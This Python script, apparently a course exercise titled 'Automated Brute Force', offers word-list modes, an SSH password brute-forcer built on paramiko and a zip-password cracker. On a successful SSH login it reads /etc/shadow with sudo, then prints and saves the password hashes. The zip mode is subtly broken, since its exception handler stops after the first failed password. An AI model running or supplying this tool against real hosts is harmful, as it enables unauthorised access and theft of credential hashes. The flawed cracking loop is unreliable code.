#!/usr/bin/python3

# Script : OpsChallenge17.py
# Purpose: Automated Brute Force

import time
import paramiko
import zipfile

def extract_user_hashes(ssh):
    # Execute a command to read the shadow file
    stdin, stdout, stderr = ssh.exec_command('sudo cat /etc/shadow')

    # Read the output and save it to a file
    hashes = stdout.read().decode('utf-8')
    with open('user_hashes.txt', 'w') as file:
        file.write(hashes)

    # Print the hashes to the screen
    print('User credential hashes:')
    print(hashes)

def menu():
    # Prompt the user to select a mode
    mode = int(input('Select a mode (1, 2, 3, or 4): '))

    # Offensive mode
    if mode == 1:
        # Accept the file path and open the file
        word_list_path = input('Enter the file path of the word list: ')
        word_list_file = open(word_list_path, 'r', encoding='iso-8859-1')

        # Iterate through the word list and print each word with a delay
        for word in word_list_file:
            print(word.strip())
            time.sleep(0.5) # Add a 0.5-second delay

    # Defensive mode
    elif mode == 2:
        # Accept the input string and file path
        input_string = input('Enter the input string: ')
        word_list_path = input('Enter the file path of the word list: ')

        # Open the file and check if the string appears
        with open(word_list_path, 'r', encoding='iso-8859-1') as word_list_file:
            words = word_list_file.readlines()
            found = False
            for word in words:
                if input_string == word.strip():
                    found = True
                    break

        # Print the result
        if found:
            print(f'{input_string} was found in the word list.')
        else:
            print(f'{input_string} was not found in the word list.')

    # SSH authentication mode
    elif mode == 3:
        # Accept the input IP address, username, and file path
        ip_address = input('Enter the IP address of the SSH server: ')
        username = input('Enter the username: ')
        word_list_path = input('Enter the file path of the word list: ')

        # Initialize the SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through the word list and attempt SSH authentication
        with open(word_list_path, 'r', encoding='iso-8859-1') as word_list_file:
            words = word_list_file.readlines()
            success = False
            for word in words:
                password = word.strip()
                try:
                    ssh_client.connect(ip_address, username=username, password=password, timeout=5)
                    success = True
                    print(f'Successful login with password: {password}')
                    break
                except paramiko.AuthenticationException:
                    print(f'Failed login with password: {password}')
                except Exception as e:
                    print(f'Error: {e}')
                    break

        # Close the SSH connection
        if success:
            extract_user_hashes(ssh_client)
            ssh_client.close()
            
    # Brute force zip file mode
    elif mode == 4:
        # Accept the input zip file path and word list file path
        zip_file_path = input('Enter the file path of the password-locked zip file: ')
        word_list_path = input('Enter the file path of the word list (e.g., RockYou.txt): ')

        # Initialize the zipfile object
        zip_file = zipfile.ZipFile(zip_file_path)

        # Iterate through the word list and attempt to extract the zip file
        with open(word_list_path, 'r', encoding='iso-8859-1') as word_list_file:
            words = word_list_file.readlines()
            success = False
            for word in words:
                password = word.strip()
                try:
                    zip_file.extractall(pwd=password.encode())
                    success = True
                    print(f'Successful extraction with password: {password}')
                    break
                except Exception as e:
                    print(f'Error: {e}')
                    break

        # Close the zip file
        zip_file.close()
